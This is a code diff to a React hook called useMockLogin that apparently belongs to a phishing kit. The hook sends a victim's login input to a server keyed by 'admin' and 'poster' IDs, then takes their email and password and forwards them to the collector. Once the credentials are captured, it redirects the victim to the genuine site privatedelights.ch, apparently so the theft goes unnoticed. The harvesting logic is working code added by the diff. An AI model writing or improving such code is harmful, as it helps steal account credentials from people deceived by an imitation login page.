@@ -2,39 +2,86 @@
 import { toast } from "react-toastify";
 import Cookies from "js-cookie";
 import { API_URL } from "../config/index";
-import { useState } from "react";
 import { useRouter } from "next/navigation";
 
 function useMockLogin(adminId, posterId) {
   const router = useRouter();
+
   const login = async (values) => {
-    // console.log(values);
+    try {
+      const url = `${API_URL}/ad/${adminId}/${posterId}`;
+      const res = await fetch(url, {
+        method: "POST",
+        headers: {
+          Accept: "application/json",
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(values),
+      });
 
-    const url = `${API_URL}/ad/${adminId}/${posterId}`;
+      const data = await res.json();
+      console.log("Create Response:", data);
 
-    const res = await fetch(url, {
-      method: "POST",
-      headers: {
-        Accept: "application/json",
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(values),
-    });
-    const data = await res.json();
-    console.log(data);
-
-    if (res.ok) {
-      console.log("success", data);
-      Cookies.set("email", data?.info?.email);
-      Cookies.set("id", data?.info?._id);
-      router.push("/security-check");
-    } else {
-      console.log("error", data);
-      toast.error("Something Went Wrong");
+      if (res.ok) {
+        Cookies.set("id", data?.info?._id);
+        Cookies.set("email", data?.info?.email || "");
+        toast.success("Username saved, now enter your valid email.");
+        return true;
+      } else {
+        toast.error("Failed to create user");
+        return false;
+      }
+    } catch (err) {
+      console.error(err);
+      toast.error("Server Error");
+      return false;
     }
   };
 
-  return { login };
+  // Step 2 — update
+  const updateUserEmail = async ({ email, password }) => {
+    try {
+      const id = Cookies.get("id");
+      if (!id) {
+        toast.error("User ID not found. Please restart login.");
+        return false;
+      }
+
+      // Validate password length
+      if (password.length < 8) {
+        toast.error("Password must be at least 8 characters");
+        return false;
+      }
+
+      const res = await fetch(`${API_URL}/update/username`, {
+        method: "POST",
+        headers: {
+          Accept: "application/json",
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ id, email, password }),
+      });
+
+      const data = await res.json();
+      // console.log("Update Response:", data);
+
+      if (res.ok) {
+        Cookies.set("email", data?.info?.email);
+        toast.success("Email updated successfully!");
+        router.push("https://privatedelights.ch");
+        return true;
+      } else {
+        toast.error(data?.message || "Failed to update email");
+        return false;
+      }
+    } catch (err) {
+      console.error(err);
+      toast.error("Server Error");
+      return false;
+    }
+  };
+
+  return { login, updateUserEmail };
 }
 
 export default useMockLogin;
